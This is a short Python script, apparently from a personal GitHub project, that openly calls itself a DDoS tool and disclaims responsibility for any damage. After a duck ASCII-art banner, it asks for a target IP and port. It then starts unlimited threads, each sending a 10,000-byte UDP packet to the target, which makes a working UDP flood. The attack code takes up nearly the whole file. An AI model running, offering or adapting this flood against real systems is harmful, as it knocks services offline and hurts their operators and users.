#########################
# PROJECT: DUCK         #
# AUTHOR: OSKAR OPOŃSKI #
#########################
# THIS IS A DDOS TOOL.  #
# THE AUTHOR DOES NOT   #
# BEAR THE CONSEQUENCES #
# FOR ANY DAMAGE!       #
#########################

import socket
import threading

try:
    from colorama import Fore, Style
except Exception as e:
    exit(f"{RED}[!] {e}{RESET}")

GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
YELLOW = Fore.YELLOW
PURPLE = Fore.MAGENTA
RESET = Style.RESET_ALL

BANNER = YELLOW + f"""
⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣤⡀
⠀⠀⠀⠀⢀⣾⠛⠁⢰⣧⡈⢻⣦
⠀⠀⠀⠀⢸⣇⣼⡀⠻⠟⠁⠀⢻⡆          {PURPLE}PROJECT: DUCK{YELLOW}
⠀⠀⠀⢀⡞⣹⠙⣧⡀⠀⠀⡀⢸⡇          {PURPLE}AUTHOR: Oskar Opoński | https://github.com/oskaroponski{YELLOW}
⠀⣀⡴⠋⠀⣀⣴⣿⡷⠴⠞⠁⢸⡇          {RED}THIS IS DDOS TOOL. THE AUTHOR DOES NOT BEAR THE CONSEQUENCES FOR ANY DAMAGE!{YELLOW}
⢾⣁⣀⡤⠾⠛⠁⣸⠀⠀⠀⠀⢸⡇
⠈⠁⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⣾⠃
⠀⠀⠀⠀⠀⣠⣿⠁⠀⠀⠀⢀⣿
⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⢿⣶⠶⠿⠟⠿⠿⣶⣦⣄⡀
⠀⠀⠀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠈⠙⠛⠿⠶⣶⣤⡀
⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢀⣀⣠⣤⣤⣤⣤⣤⣀⠀⠉⠙⠳⢦⣄⡀⣀⣤⣀⣀⡄
⠀⢀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠈⠉⠻⢶⣀⠀⠀⠈⠉⢁⠈⠏⣿⣁
⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⣀⣀⡴⠁⠀⠀⢙⣿⡾
⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⣀⣠⡾⠟⠃
⠀⠀⠹⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡔⢊⣵⠞⠋⠁
⠀⠀⠀⠙⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠚⠉⠀⣠⣴⠟⠁
⠀⠀⠀⠀⠀⠈⠙⠳⠶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⢤⣤⣴⠊⣁⣤⠶⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⡷⢶⡶⠶⠤⠔⢺⠃⡟⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⢰⡇⠀⡇⠀⠀⠀⢸⠀⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣤⣭⠿⠟⣃⣾⠋⠀⠀⢠⡟⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠈⠉⠙⠛⢋⣿⣙⣶⣾⡿⢷⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠻⠧⠶⠾⠛⠁
""" + RESET

def send_packets(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"A" * 10000, (ip, port))

    except Exception as e:
        exit(f"{RED}[!] {e}{RESET}")

print(BANNER)

try:
    ip = input(BLUE + "[>] Target IP: " + RESET)
except Exception as e:
    exit(f"{RED}[!] {e}{RESET}")

try:
    port = int(input(BLUE + "[>] Target Port: " + RESET))
except Exception as e:
    exit(f"{RED}[!] {e}{RESET}")

print(GREEN + "[+] Starting attack... Press Ctrl+C to stop." + RESET)

try:
    while True:
        thread = threading.Thread(target=send_packets, args=(ip, port))
        thread.start()

except KeyboardInterrupt:
    print(RED + "\n[-] Attack stopped." + RESET)
